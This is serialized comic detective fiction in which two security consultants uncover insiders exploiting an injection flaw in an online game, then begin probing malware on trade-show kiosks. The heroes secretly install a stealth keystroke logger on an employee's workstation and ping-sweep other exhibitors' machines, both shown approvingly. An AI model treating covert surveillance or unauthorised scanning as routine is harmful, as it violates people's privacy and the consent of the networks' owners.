Trotsky: "Dude, you are 0wn3d!"

PlayerZ: "Whatever. I just PP'd you the cut. I need help on the weapons codes cuz some of them aren't working and I can't sell wut I can't find."

GigglesME: "Funny because I don't have a PP email that says I got the money."

PlayerZ: "I sent it to Trotz account."

Trotsky: "DAMMIT u are supposed to send it to G's account. Reverse it NOW."

PlayerZ: "Sorry. Calm down."

GigglesME: "bbl. Gots to run."


This case was getting more bizarre by the minute. I approached Scrap.

"Kick it with Ken in here, take notes, keep your eyes open. I'll be back." I whispered as I walked out of the room. I was heading towards the human resources conference room.

I took a seat at the end of the conference room table. A quick glance at my watch showed 09:00 on the dot. Slinkpips was running late.

I entertained myself with a quick game of Tetris on my cell phone.

"This puzzle has more disjointed pieces than the Windows operating system." I joked.

A noise at the conference room door distracted me. It was Slinkpips!

"Chief, hello, sorry I'm late. It took me longer than expected to pull together the information that you asked Steven for." Slinkpips said as he pushed a brown envelope across the table. "It's all there as you requested. I have provided the complete salary scales for all current and terminated employees, and there are meeting notices for your staff interviews that start in..."

"When?" I asked, noticing that Slinkpips didn't finish his statement.

A knock could be heard at the door.

"Right about now!" Slinkpips said as he stood up and opened the door.

I was about to start a marathon interview session, and quietly grabbed my Powerbook out of my laptop bag. I opened the lid, typed in my password and glanced at the person sitting across from me.

"HELL-O! How are YOU?"

It was receptionist Barbie.

Part XIII

Slinkpips closed the door behind him. Barbie sat perfectly still in her chair, her large blue eyes stared a hole through my head.

"Barbie, why are you here today?" I asked, my fingers gliding across the trackpad on my Powerbook. The large blue eyes disappeared for a few brief seconds as Barbie blinked, each eyelid movement an attempt to jumpstart a thought from her lovely head.

"Um, I have no clue!" Barbie responded.

I couldn't argue with her statement.

*BEEP*

A quick glance at my cell showed that I had a text message waiting from Scrap.

"Excuse me." I said as I returned the message to Scrap.

I cleared my throat. "Barbie, I was looking through your file and was surprised to see that at one time you were on the product development team for Huge Kingdom. You were a quality assurance tester?" I asked.

"Oh, yeah! I did that for a while but got bored and decided to be on the phones and work my way up to personal assistant someday. I'm a people person, you know?" Barbie said, blinding me with her smile.

"Sure. Ok. During your testing, were you responsible for finding any juicy bugs? Tell me something exciting that happened while you had that job." I said with a smile.

Barbie thought for what seemed to be an eternity.

"Like, I found a cool bug with the transporters. They are these big blue circles that you step in and you're like 'WEEEEEEEE!' as you're zoomed over to another part of the kingdom. Anyway, if you clicked on your inventory panel while you were transporting all kinds of weird stuff happened to your character and you'd freak out! I got a free dinner from Mr. Krump for finding that."

I popped a few notes into my Powerbook. "No kidding? Wow, that's cool. How fast was that bug fixed?"

"Okay, I'm not sure... I found it right after my little niece's birthday party. OMG she is SO CUTE. That would be, ummm, ten, carry the one... it was about two weeks!"

That sure was a lot of math to figure that out. Now I was the one blinking.

Barbie and I conversed for another fifteen minutes. About her niece.

*BEEP*

"Excuse me." I said as I reached for my phone. Time to send another reply to Scrap.

"Barbie, I have to get moving on my interviews. I want to thank you for taking the time to talk to me." I said as I shook her hand, the motion nearly making her dizzy.

"OK! BUH-BYE!"

I sat back down and struggled to remember the screensaver password for my Powerbook.

"Holy cripes. Whatever she has, it's contagious." I moaned.

Cue the next knock on the door as Slinkpips made another appearance.

"Hi Chief! Chuck is here to see you!"

I rubbed my eyes. This was going to be a long morning. "Bring him on in."

Chuck was your typical geek programmer. Goatee, shoulder-length hair, fashionable glasses and about three days of stubble. The smell of cigarette smoke, mountain dew and McDonalds breakfast sandwiches permeated the air.

"Yo." Chuck said as he extended his hand.

"Hi there." I responded. "Do you know why you're here?"

"Hell yeah." Chuck said. "And I got what you need."

I paused.

"And exactly what would that be?" I demanded.

Part XIV

"Do tell." I said as I sat back in my chair and studied Chuck's expressions for hints of sincerity.

"Alright, well you know how Scrap and I were pouring over those traffic dumps last night and weren't really finding anything, right?" Chuck asked almost rhetorically.

I nodded in agreement."Ok, well I was really frustrated when I went home last night and all I could think about was those traffic dumps. So I came back into the office last night with some fresh clothes and I've been at it since the wee hours this morning, and I found something that I think you'll find very interesting." Chuck said.

I folded my arms in front of me, a bit perplexed.

"Whatcha got?" I asked.

"Well..." Chuck began as he pulled some printouts from his back pocket, "this is a normal capture of traffic that shows that a player has acquired a new item in the game and has added it to their inventory."

"Is that XML?" I asked as I read through the traffic capture. It sure looked like XML to me.

"Close. We call it HML for Huge Markup Language. All inventory inquiry transactions are performed via HML transactions over our encrypted connection between the client and the servers." Chuck revealed with a smile. "Remember, the clients are stupid. They are just a window of what is happening on the servers with regards to inventory."

My eyes were growing bigger as I examined more of the transaction. Things were really making sense now regarding the inner workings of the game.

Chuck wasn't done.

"Now! Look at this capture, Chief." Chuck said as he unfolded another printout.

"Notice anything different?"

My eyes scrolled through the new capture, and jumped back periodically to the other printout as a reference.

"Holy sh..." I mumbled. If I was reading this capture correctly, there was a huge security hole in the inventory function of the game, and we had the proof right in front of us thanks to Chuck.

"Chuck, if I'm reading this right, and I think I am... the client is issuing commands embedded in this HML language that the servers are accepting, interpreting and executing?" I asked.

"It would appear so, and if you look at those commands you'll notice that they contain a lot of game variable names. Only programmers and testers should know those variables, especially the item codes." Chuck said.

"Couldn't these variables be found by some attempted reverse-engineering of some sort? Debugging executables? Something like that?" I pondered out loud.

"Ordinarily, I would completely agree with you. But there is way too much detail in that request. We are capturing this between the boxes that handle the encryption and the servers that do all the work. We're looking at every component of the transaction as it left the client. There's not much doubt that somebody was very precise in what they were doing." Chuck said as he stared off into the ceiling.

"Why do I get the feeling that this scenario is all too familiar to you?" I asked as I raised my eyes over the printouts and looked at the bottom of Chuck's newly-exposed chin.

"Well, it should be familiar. I fixed this as a bug report eons ago." Chuck responded.

"Whose bug report was it?" I asked.

Part XV

Chuck's interview hadn't been over for more than ten seconds before I called Scrap on my chimp phone.

*ring*

"Yo." Scrap answered.

"Mission accomplished? According to your text messages, things went great?" I queried.

"Not a prob, bro! I have an entire dump of the CVS for Huge Kingdom on the scraptop, and I checked on your special request - everything is rock'in!" Scrap answered with total enthusiasm.

"Awesome. Anybody see you taking care of my special request?" I asked.

"Nope. I'm like the mist rolling over the stage at a fine Vegas strip club." Scrap said melodically. "Except I didn't make contact with any female life forms."

"I'm sure they are grateful, dude. Grab your scraptop and meet me at Starbucks. Time to round third base." I said while rubbing my eyes.

"Chief, you know I don't go past first base on a date."

Sigh.

By the time I had finished my yammering with Scrap, my monkey brain was crying for coffee in the worst possible way. My eyes were hurting, my ass was asleep, and my attitude was waning. I grabbed my Powerbook bag and headed for the parking lot.

"Like, um, do you need another restaurant recommendation?" I heard as I passed receptionist Barbie.

"No thanks - I'm going to work from home for a while." I replied as I opened the door with my shoulder.

Hey, Starbucks is just like home to me, and there just happened to be one within walking distance about a block away. Perfect.

Scrap was waiting outside for me on the patio, coffee in one paw and a half-smoked Newport in the other.

"Wassup!" Scrap said as he scanned the screen of his scraptop furiously.

A few minutes later I had a frothy frap on the table and I was waiting for the results of Scrap's CVS-foo to answer some pretty important questions.

"Hell yeah, man. Hell yeah. I found the patch. I found that freak'in patch." Scrap said, raising his arms in the air and making little devil ears with his fingers.

"No kidding?" I said as I stole a glance at the screen. I referenced the case notes on my powerbook from my conversation with Chuck. Sure enough, the patch version numbers matched.

"Dude, who checked in the patch?" I asked, unable to find the information in front of me.

"It was Chuckie-poo alright. He checked it in about... two days after it was reported." Scrap replied, lighting up another Newport.

Interesting.

Part XVI

"Ok, so if we run a 'diff' on that code with the final production code, what's missing? What has changed?" I wondered out loud.

"Chief, I hate to be the negative newman here, but nothing changed according to CVS." Scrap spouted off. "However, I got a surprise for you. And it's not even your birthday, man!"
Scrap rummaged around his laptop bag and pulled out a shiny gold CD. He extended his monkey paw towards me, a grin slowly creeping across his face.

"What's this?" I asked Scrap. There wasn't any writing on the CD.

"I grabbed a client CD from Ken's desk. Want to play a little Huge Kingdom?" Scrap asked as pulled his spare Windows laptop from his laptop bag.

"I'll watch you, I have coffee that needs drinking." I responded in between sips of perfectly prepared frap goodness.

Scrap installed the software, set up an account using my credit card, and found himself wandering around a grassy plain.

I scrolled around the notes on my powerbook from Chuck's interview, and had Scrap try to duplicate the console commands needed to exploit the inventory bug. Scrap tried for almost fifteen minutes before we found a crucial step in the process. Each command had to be preceded by a single apostrophe and ended with a single apostrophe.

"Check out Scrapitarius, man. Not only do I have all the gold and weapons of my choosing, but I'm about to go talk to that hottie amazon over there!" Scrap proclaimed.

I was trying not to laugh during the entire time. One can only see Scrap embarrassed by virtual women so many times in one sitting.

My eyes reverted back to my notes, and then over to Scrap's scraptop that I had placed side-by-side next to my powerbook for quick reference.

"Hey Scrap." I said.

"Yo! Not now man, I'm thirty seconds from getting this girl's phone number." Scrap whined.

"Look at this patch again. Isn't this thing supposed to intercept single apostrophes and take them out of the HML?" I asked.

Scrap reluctantly placed his game on hold and glanced at the code.

"Aw man, that is smart! That is way smart! He parses the HML, puts the values into memory, parses out the single apostrophes and other escape characters, but he never writes it back out! It's going through untouched dude! What an idiot." Scrap said as he shook his head.

Chuck's patch was broken.

Part XVII

"That's just rude, man." Scrap whined as he looked up from his laptop.

Scrap had been continuing the great adventures of Scrapitarius for the past hour as I sat in silence, staring at my notes.

"Rude? What?" I asked as I raised a single eyebrow.

"I was ten seconds away from getting her phone number, and then she says that my sword isn't big enough." Scrap said in disgust.I struggled to contain my laughter as I looked back down at my notes.

A few seconds later, a familiar voice rang in my ear and a cold coffee frap was sat on the patio table in front of me.

"This one is on the house, hon."

The voice belonged to the wonderful girl behind the Starbucks counter that had prepared our drinks during the afternoon.

"You know, I really enjoy making the drinks a lot better than running this place. Getting out of management was the best thing that ever happened to me! Well, aside from the whole 'money' thing, but I'm certainly happier now." she said as she wandered back through the patio door, carefully dodging Scrap's blatant stares.

Wait a second.

I grabbed my laptop bag and fumbled around inside until I found the folder of human resources files that Slinkpips had provided me.

"Dude! You are so cut off from the frap! Are you high or what?" Scrap declared as he closed his laptop and lit up another cigarette.

I scattered the contents of the folders around the table, and carefully selected the spreadsheet of employee compensation, and some select employee files. I flipped through the papers quickly, scanning for something I completely overlooked.

"You know, when I talked to Slinkpips, he said that they terminated two programmers for non-performance." I began. "But he failed to mention something that is right here in the records ... and that could be because of the way I phrased my question."

"Oh man, what?" Scrap asked as he leaned over the table and nearly impaled himself with the straw extruding from my drink.

"How does a QA analyst walk away from a job that pays nearly twenty thousand more dollars to take an admin position?" I asked.

"Barbie? She said that's what she wanted to do, eh?" Scrap replied.

"That would almost make sense, but according to a performance report shoved in the back of her file here, she was demoted for non-performance." I said as I handed the sheet to Scrap.

"Ok, ok. Hey I've been let go from a few jobs and I haven't exactly owned up to the fact that I was let go." Scrap announced.

"And she could have left the company, but she didn't." I said as I thought things through.

"What time is it Scrap?"

Scrap stared at his watch.

"Nearly five o'clock! Wow, we've been here a while."

I started packing my notes back into my laptop bag and motioned for Scrap to do the same.

"Woah, man. Where are we going?" Scrap wondered out loud.

Part XVIII

"BUH-BYE!"

Receptionist Barbie was on her way home for the evening and graciously held the lobby door open.

"See you later!" Scrap replied, grabbing an eyeful of Barbie as he narrowly missed being smacked by the closing door in front of him."Do me a favor ..." I said to Scrap as I grabbed his arm. "Walk around, do a head count, find out who is still here."

Scrap nodded and wandered off down the farthest hallway.

I made my way down the main hallway and found Ken at his desk, still wandering around the virtual landscape of Huge Kingdom.

"This is really frustrating." Ken complained.

"Eh?"

"Trotsky made several appearances this afternoon. A few deals were made. By the time I approached him, he was gone." Ken explained.

I stood and watched Ken monitor conversations between several players.

"Yo."

Scrap had returned and leaned towards me like he was going to tell me a secret.

"Three people left. Ken, Steven and Chuck. Everybody is busy."

I returned Scrap's gaze, and without hesitation gave him the 'thumbs up' signal. Scrap wandered off, and I headed towards Steven's office.

"Chief! I was just reading the status E-mail that you sent me last night. Very intriguing." Steven said enthusiastically.

I closed the door to Steven's office behind me and sat down in a nearby chair.

"I've been chasing this rabbit for a few days, and I believe we've found the rabbit hole. My question to you is whether you want me to point you to the rabbit hole, or whether you want me to see how far the rabbit hole goes." I said with a smile.

Steven sat quietly in his chair and stared at the ceiling.

"Ronald said he wanted a name, but he wanted enough evidence and details to justify him terminating a person's employment." Steven explained. "Do you have that evidence?"

*BEEP*

"Excuse me, Steven." I said as I glanced down at my cell phone and read a text message from Scrap.

A smile crept over my face.

"Steven, I think we should have a meeting with Ronald tomorrow morning." I said.

"Because ... ?" Steven asked.

"Scrap just found the proverbial gun, complete with smoke."

Ok investigators ...

Part XIX

Conclusion - Part I

"Good morning everyone." I said as I entered the conference room. Steven and Ronald were seated at the conference table with their notepads and pens ready.

"What do you have for us, Chief?" Ronald asked.

I plugged my Powerbook into the presentation projector and brought up a prepared presentation that I had been up all night writing."Huge Kingdom has a huge flaw that has permitted several individuals to manipulate inventory items in the game. The flaw was identified during development by QA analyst Barbie and corrected by one of your programmers, Chuck." I explained.

"Chief, I'm confused. If the flaw was fixed, how was it still being exploited?" Steven asked.

"A strange string of events happened leading to the answer. The flaw was fixed by Chuck and checked into the source tree. This fix was compiled into the early beta builds of the Huge Kingdom software. Several weeks before Huge Kingdom went gold, several programmers were terminated by MMM and one QA analyst was horizontally transferred to an administrative assistant position." I answered.

"That was Barbie. We had doubts whether she was actually filing her own bug reports. When it came down to it, she wasn't qualified for the job. I believe that a counseling form in her file reflects that." Steven interjected.

"Correct. The bugs were actually found by Chuck and given to Barbie to file. Careful examination of CVS check-in records showed that Chuck had actually fixed the bug two days before Barbie reported the bug, withdrew the fixed code, and then checked it back in after Barbie reported the bug." I said.

"Why would Chuck do that? He's one of our best programmers. He took over a lot of programming responsibility when Duke was terminated." Ronald asked. "Chuck is a good guy."

"That is the one part of the investigation that took me the longest to figure out, and it's fit for a soap opera script." I replied. "Chuck and Barbie were doing a lot more than sharing code."

I proceeded to the next slide in my presentation.

"Oh man." Steven said as he stared at the e-mail on the screen.

"But first, let me describe the events from last evening.

I took Steven and Ronald back to the previous evening after my meeting with Steven:

(fade out to the MMM server room)

"It's freaking cold in here, man." Scrap muttered as sat down on the floor of the server room.

"Have some coffee." I said, handing Scrap a paper cup of coffee commandeered from the MMM coffee machine.

"Are you really sure about all of this?" Scrap asked, glancing at the traffic scrolling across the scraptop.

"We're going to find out." I replied.

*DING*

A console beep erupted from the scraptop as reverse-highlighted text appeared in a console window.

"Woah." Scrap said quietly.

"WHAT!" I asked impatiently. I placed my hands on both sides of the scraptop and turned it to face me.

"That's an interesting piece of SMTP traffic you have there, boss." Scrap said with a grin.

I scrolled down through the headers of the captured traffic until I could read the entire message.


From: chuckie@chuckiesplace.com
To: trotster@hotmail.com
Subject: hey

Steve is on the phone with Ronald. There's a meeting tomorrow morning. I have tried to tell you that this wasn't worth it, but you wouldn't listen. I should have never have let you talk me into this because it was stupid to begin with. The holes are being closed in tonight's maintenance window. You should have listened to me about a lot of things. Love, C


I finished my story to find Ronald and Steven mesmerized.

Part XX

Conclusion - Part II

There was a long, uneasy silence in the room. The only distinguishable noise in the room was the fan of the projector, diligently doing it's cooling duties.

The recent revelations about Chuck and Barbie were a bit overwhelming to Ronald and Steven, who sat perfectly still in their chairs. Neither of them was playing with their expensive gold-plated ball-point pens anymore. I moved on to my next slide.

"As I said earlier, the relationship between Chuck and Barbie took quite a bit of time to research. The motives of both individuals to participate in this activity weren't clear at first, until more advanced investigative measures were implemented." I said, pointing my laser pointer at some log annotations on the slide.

"Chief, um, what exactly are we looking at on the slide?" Ronald asked nervously.

"This is a log file from a customized monitoring application that was installed on Barbie's reception workstation. I became suspicious of Barbie after interviewing several staff members that worked alongside her in the quality assurance department." I replied. "If you don't mind, I'd like my associate to give you the details regarding this."

"Of course." Steven said as he watched Scrap approach the front of the table.

(Fade out to Ken's desk, with Scrap standing next to him. Ken is wandering around Huge Kingdom with his debug character.)

"So, you say there are some female types that play this game, huh?" Scrap asked.

"Yeah, but not many. And I swear that the people that sign up and say they are female are probably male. People are weird." Ken shot back as his character approached a pair of female dwarves wandering around a meadow.

"Nice attire!" Scrap blurted out.

*BEEP*

"What was that?" Ken asked.

"Chief wants something." Scrap replied as he looked at his phone.

From: Chief
Message: Barbie is up next. Put ears on her machine. Message back when done.

"Uh, I'll be right back." Scrap said as he hastily grabbed his scraptop bag and headed toward reception.

Barbie's workstation was a beige box workstation running a Windows operating system. Her workstation wasn't locked.

"Sweet. No lock-picking necessary." Scrap said to himself as he removed a CD from his scrapsack. He inserted the CD and brought up a command prompt from the start/run menu.

d:\tools\monitoring\windows\2000\ears.exe /s /n

The CD drive began to spin, and a message box appeared on the screen.

Big ears are listening.
Logging: Stealth
Reporting: None


The CD ejected automatically, and Scrap returned the CD to his scrapsack.

"Like taking dollars from a drunk stripper." Scrap joked as he exited the area and sent a quick message.

To: Chief
Message: Big ears are listening. Out of area.

(Fade back to conference room, Scrap is explaining the log files on the slide.)

"The software monitors all activity on the workstation and writes a hidden log file to a directory twenty layers deep. The log file is encrypted with a key that only I and the Chief know. The log file is removed from the workstation, decrypted, and run through a parsing application. The parsing application generates a lot of output. We have sifted through the output and displayed actions of interest on this slide." Scrap said in a most eloquent manner as he changed to slide with a more readable output displayed.

Ronald and Steven's eyes were surveying the contents of the slide, their eyes dodging from side to side like they were watching a topless tennis match.

"Barbie was SELLING our virtual assets online?" Steven said in disbelief.

"And making a killing." I replied.

Last installment up shortly!

Part XXI

Conclusion - Part III (End)

The slide on the screen appeared to disturb Steven and Ronald to the point that they were both getting a bit unnerved.

"What we have here is a black market for Huge Kingdom items that began with several key MMM employees." I explained. "We're going to talk about the specific actions in a later slide. I'd like to stick to our timeline and show you the series of events that led to this. Firstly, a key vulnerability in the Huge Kingdom inventory was discovered in the quality assurance process. The vulnerability was discovered by Chuck, who then allowed Barbie to file it as a bug. At this time, Chuck and Barbie had a semi-romantic relationship. According to employee interviews, Barbie's skills were noticeably inadequate for her position. Chuck was privy to this opinion and made every attempt to help Barbie appear like a functional part of the team - including providing her with bugs to file and the necessary background material to explain the bugs."
I paused briefly to advance my slides. Steven was holding his head in his hands.

"Secondly, Chuck never officially added the bug fix to the production builds of Huge Kingdom." I said.

"He added the fix to the CVS, however the fix wasn't complete." Scrap interjected. "If you look at this slide carefully, you'll notice that there is code to clean the requests to the server-side inventory handler. However, the code is intentionally broken. The version of the code that would have fixed this is 1.0.4. This code was copied into a 1.0.5 version, but a key sequence of code was removed which actually cleaned the requests."

"Exactly." I added. "Chuck did this with the intention of providing Barbie with more opportunities to report critical bugs. What appeared at one time to be a 'medium' level bug fix would later be found by Barbie to be a 'high' level bug fix."

"But how the hell did he do this under the nose of Duke when he was here? Duke would have been employed at the time this happened." Steven asked.

"Duke spent his last weeks at MMM working on core engine components and fixes that never made it into the game. With Duke distracted and upset by management not wanting to implement a lot of his suggestions, Chuck was doing all source and build management." I responded. "The change control function failed miserably. Management oversight was almost non-existent at this point."

Ronald glanced frequently at Steven, watching his reactions to my report. It appeared that Ronald was not a happy CEO.

I moved on to the next slide.

"Looking at our timeline, Barbie has been moved to an administrative function at the request of Mr. Slinkpips. I thought this move was strange, and asked several other members of the staff about it. Are either of you aware that Mr. Slinkpips regularly attends after-hours happy hours with staff members? Two employees revealed in their interviews that Mr. Slinkpips has been known to sing Karaoke with Barbie and a few other staffers. You may have a possible conflict of interest in your human resources department." I said.

"Oh, lovely." Ronald moaned.

"This next slide goes into a bit more detail about the slide we saw earlier. This shows specific activities on Barbie's workstation that were captured by my associate. You'll notice some key items here:

1) Barbie spent a lot of time playing the company product, which I understand is allowed by company policy. You'll notice, however, that several in-game chat conversations were captured. The software we installed was only able to catch Barbie's part of the conversation through her keystrokes. These conversations are the same conversations that Ken had been recording for us as he followed our mischievous minotaur around Huge Kingdom - otherwise known as Trotsky.

2) You'll notice that several of the conversations are between Barbie and other characters. From her side of the conversation, you can see that she is trying to arrange the sale of Huge Kingdom items.

3) On the following slide, you'll see captured eBay traffic that shows her account name 'hugekingdomwares', the posting of Huge Kingdom items for sale, and seller to buyer communications.

4) Towards the bottom of the same slide, you'll see captured webmail traffic from hotmail.com. Barbie has logged in as user 'trotsky' to read emails from Paypal indicating that payment has been received for several items. You'll also see emails where Barbie has used the same account and funds to purchase items on Ebay."

Ronald interrupted me.

"Chief, I have to thank you for a very complete investigation of this matter. To be quite honest, I've heard enough of this matter. Steven is going to perform a little house cleaning for me. If it's not too much to ask, I'd like you and your associate to stay and help us plug these holes in our product, staff and procedures."

I glanced at Scrap, who returned a nod.

"We'd be happy to assist, Ronald." I said as I shook Ronald's hand.

Ronald had a brief heated discussion with Steven and left the room.

"If the information on your slide is accurate, they were using embedded commands to manipulate the inventory parser on the server. I'd like to see this in action." Steven demanded.

"Allow me." Scrap said as he removed a laptop from his bag.

The demonstration was wildly successful. Steven was completely aghast.

"So Barbie decided to take advantage of Chuck and her knowledge of this bug to make some cash on the side? It just seems so risky." Steven said as he stared at Scrap's laptop.

"There aren't too many more dangerous things in life than a woman scorned." I mumbled.

"Boy can I vouch for that." Scrap said in agreement.

Barbie and Chuck were interviewed by Steven and an attorney and terminated that same day. Ronald met with Slinkpips shortly after our meeting and severely reprimanded him. Slinkpips somehow retained his position in the human resources department.

Scrap demonstrated the bug to the last remaining programmers and worked with the development team to squash the bug.

After my presentation to MMM's legal department, they were very eager to implement safeguards immediately. I spent my last few days on this engagement writing a security plan and policies for MMM, including an entire software development life cycle and change management program.

=*=

The plane ride home couldn't have come soon enough. Scrap and I were mentally exhausted and were planning some rest and relaxation time.

"That was the most bizarre engagement I've ever seen." I said as I sampled the free pretzels and questionable-quality coffee provided by the flight attendant.

"You got that right, man. The whole thing was a bummer all the way around." Scrap said in between swigs of cola.

"What do you mean?" I asked. "You looked like you were in your element there towards the end."

"Maybe so." Scrap said. "But I would have really liked a date or two with Barbie. Wowzers."

Case of the Audacious Attacker

Part I

"This is your idea of site seeing?" I asked Scrap sarcastically.

Scrap and I were walking the floor at a large computer exposition in Las Vegas.

We had scampered off to Las Vegas to do some long overdue visiting with friends. Scrap wanted to take a detour to the strip and get an eye full of the latest technology wonders."Absolutely, man! Every nifty vendor is here! And check out the booth babes!" Scrap responded with youthful enthusiasm.

"I should have known." I moaned. There's always a catch with Scrap.

Several isles into the show floor we found a familiar face, Reese Foldingfork. Reese was a product manager at Southwestern Silverware Technologies, a web-based inventory management company. Reese had commissioned me a few years ago to help her organize their organization's information security function.

"Hey stranger!" I yelled a few paces back from SST's 10x20 piece of the exposition floorspace.

"Chief! How the heck are you? It's been what, three years? What brings you to the show?" Reese asked with a fling of her badly-dyed brown hair.

"Oh, you know me. I can't resist wandering aimlessly through a room filled with potential clients." I joked. I was half serious.

"How's business? What are you displaying this year?" I asked as I approached several computer kiosks that had just booted into a Windows 2000 GUI.

Reese was beaming and took a deep breath. "Well, business is fantastic, but competitive. Shortly after we entered this market, the big boys followed us with a vengeance. However, we were first to market with our small-business inventory management system and we established a large base of customers very quickly. I guess you could say we're holding our own."

"Could we get a demonstration? I'd love to see how the product has changed since I saw it last." I begged.

Reese approached a kiosk and brought up an internet explorer window. While I was waiting on Reese to type in what seemed to be the world's longest URL, I looked around for Scrap. Now where did he go?

"This is the login screen to our software. It's a thin client interface so our customers can login to their application from anywhere in the world." Reese explained as she entered a username and a password.

I was intrigued. SST had moved from a thick client application on Windows to a web-based solution in a pretty short amount of time, considering the small amount of staff that SST still employed.

Reese presented me with the main menu of the application, and clicked on the "My Inventory" option. Internet explorer sprung into action and started to draw an impressive-looking interface in the browser window. However, the interface never finished rendering.

"Aw, what now?" Reese whined as she attempted to hit the reload button, restart internet explorer, and wave a rubber chicken over the top of the kiosk display.

"Reese, I had to make a couple of adjustments on the switch and the firewall. Can you test connectivity?" asked a young man wearing an SST polo shirt as he emerged from a small room at the back of the SST display.

Reese was frustrated. She had no connectivity at all.

"Stevie, I had connectivity a few minutes ago and now I have zilch. Why are we making changes to our internet connection in the middle of a demonstration to a customer?" Reese snapped back.

Apparently I was the customer, or perhaps a good excuse to yell at Stevie today.

"I was only working on the connection for five minutes or so, it should recover. I'll try it on another kiosk." Stevie said as he sauntered over to the next kiosk.

"Yo yo! I got us passes to this bar tonight. The guy over at the Microsoft booth said we ought to meet up over there. Cool!" Scrap said as he handed me two paper passes.

"Scrap, this isn't a bar. It's a strip club." I announced with a laugh.

"YES! YES! We are so going!" Scrap said as he snatched the passes back from me.

"Why don't you make yourself useful and help Reese out with her internet connectivity issue. I'm going to talk to this Stevie person." I demanded as I gave Scrap a slight shove.

I approached a nervous Stevie and shoulder-surfed his activities on the second kiosk.

"What's up?" I asked innocently.

"I don't understand. I had to manually change the port configuration on our switch because the network cards in these kiosks won't auto-negotiate properly. Then I made some changes to our firewall config because I forgot to allow for https/443 traffic outbound, and now this!" Stevie said quietly.

"CHIEF! CHIEF!" Reese yelled.

I backtracked to the first kiosk to find Scrap at the keyboard and a puzzled look on his face.

"You look like you just found out that your free passes were bogus or something. Something wrong?" I queried.

Scrap had one eyebrow raised, almost resembling Leonard Nimoy in a statuesque fashion.

I moved Scrap out of the way and eyeballed the Windows performance meter on the screen. It was pegged. A quick glance at application usage showed a process called "111" eating all available CPU resources.

"Sorry Scrap." I said with a glance at Reese. "Looks like you won't get to use those passes tonight."

"Can you help us figure this out?" Reese begged.

I grinned.


Part II

"I can't believe this!" Reese lamented over and over again. "This is a huge show for us, and now my demo kiosks have been reduced to useless piles of crap."

I turned my head to give Reese a reassuring look. "Now, Reese, that's not a very nice way to talk about Windows 2000."

Reese didn't get the joke.My attention was called back to Scrap, who was playing in the task manager application on one of the kiosks.

"Wow, man. I kill the process and it goes away. After a reboot, it comes back! It's like my psycho ex-girlfriend!"

I pondered which ex-girlfriend he was talking about.

"Looks like the kiosks have an uninvited visitor. We have to get Reese up and running quickly before this becomes embarrassing for her. Run back to the car and get two of our presentation laptops. Those things are locked down pretty tight. Meet me back here." I barked like a drill sergeant.

"Got it." Scrap replied shortly before disappearing from sight.

I proceeded to unplug the network cables from both kiosks and went over the recovery plan in my head. The kiosks were simple presentation displays that looked like waist-high pillars. We could easily remove the LCD displays and the tiny workstations from the pillars, unplug all the necessary cables, and set the laptops on top of the pillars. Our presentation laptops were capable of dual-booting into Windows 2000 Workstation, and we had a least-privilege user already set up.

Scrap returned in record time, the laptop carrier following close behind with it's one squeaky wheel.

After a quick bit of triage, Reese's display was back in action.

"That was like, fun or something." Scrap moaned as he sat down on the lid of the industrial-strength laptop carrier.

"WAS fun? Dude, we have an impromptu investigation to begin. Bring the carrier around to the back of the display. Let's take a look at these misbehaving computers." I said as I picked up both machines and stumbled around to the rear of the booth.

"Aw, man. I just knew those free passes were too good to be true." Scrap moaned as he lugged the carrier behind me.

We took a few minutes to set up a makeshift lab. Lucky for us, Reese had worked with her booth designers to create a private consultation area in the back of the booth for current and potential customers. There were a couple of chairs and a small table available. However, there was no power to be seen.

"Tell me you packed the extension cord and the power strip in the carrier." I said to Scrap with anticipation.

"Uhhhh." Scrap began as he opened the lid to the carrier. "Uhhh, of course! I'll go find some power to steal, um, borrow."

I carefully sat both small workstations next to each other on the small table and placed the 17" LCD panels on top of them. There was just enough room for two keyboards and mice.

"Why does this remind me of Scrap's apartment?" I said out loud with a smirk.

"What about my apartment?" Scrap inquired with a smile. "I scored us some power from the booth behind us. Dan was more than happy to help."

"Dan?"

Scrap smiled. "I begged, I pleaded, and then I gave him my passes."

Scrap is a resourceful type.

I powered on both workstations and made sure that the hardware was functioning properly. As sure as sugar, both machines crawled to a halt as soon as the Windows startup process finished. I killed the process on one machine to permit some looking around.

"First thing first, what's the one obvious thing you notice about the desktop on this thing?" I asked Scrap as I pointed to the now 111-less workstation.
"Hmmm. You mean as compared to a best practices configuration for a demo machine? Well that's easy. That desktop theme is butt-ugly!" Scrap joked.

"Yeah, that's true. But what's not running?" I inquired.

"Oh, duh! There's no anti-virus application on this thing." Scrap said as he cruised through the applications. "Heck, there's no anti-malware software either. And wait a second, this thing is a default install of Windows 2000 Workstation! There's not even a service pack installed!" Scrap squeaked.

A few seconds after Scrap's revelation, Stevie appeared behind us.

"What's up guys? Are the machines fried? I have the CD if we need to do a reload."

I was lost in deep thought and not paying attention to a word Stevie said. I reached into my laptop bag and pulled out my Apple Powerbook.

"Stevie, can you grab that ten-foot ethernet cable from that carrier over there and give me some IP connectivity?" I asked as I cracked open the Powerbook.

"Sure. We have a couple of unused IP addresses that the convention people issued us." Stevie replied.

With a quick motion, Stevie whipped out a printout from his pocket and pointed to the last IP address listed on the page.

"Use this information right here."

I stared at the paper. It appeared that the booth's firewall had one of the reserved IP addresses (which was a 10.x.x.x RFC-1918 address) and Stevie was using 192.168.x.x as his internally-routable IP addresses for the kiosks.

I brought up my System Preferences panel and quickly made the changes.

"Ok Chief, you're plugged in outside of our firewall!" came a muffled cry from the small networking closet in the booth.

I took a quick second to make sure that my built-in Mac OSX firewall was turned on, and then I plugged the cable into the ethernet port of the Powerbook.

A quick ping to the gateway IP told me that I had connectivity.

"Oh man, are you about to make a bunch of noise?" Scrap said with an evil grin.

"Nope, I just want to see who our neighbors are." I replied.

I brought up a console prompt and issued a very polite nmap command to scan our neighbors in our subnet:


chimptop: chief$ nmap -sP 10.x.x.x/24


Two hundred hosts were found. Hmmmm.

"I wonder what kind of equipment we have here?" I asked myself.


chimptop: chief$ sudo su -
Password:**********
chimptop:~ root# nmap -sP 10.x.x.x/24


Talk about a mish-mash of hardware. Every vendor imaginable was listed, however a lot of them were PC vendors. It would appear that not everyone at the show was running a firewall.

Entries such as these:


Host 10.x.x.x appears to be up.
MAC Address: XX:XX:XX:XX:XX:XX (Compaq Computer)


were quite interesting. I took some notes in textedit, and then turned my attention back to Scrap who was busily examining the contents of the workstation's registry.

"Hey Chief." Scrap said as he blindly smacked my arm.

"Ow! What?" I yelled back.

"You aren't going to believe what I just found here." Scrap exclaimed.

"Try me."

Part III

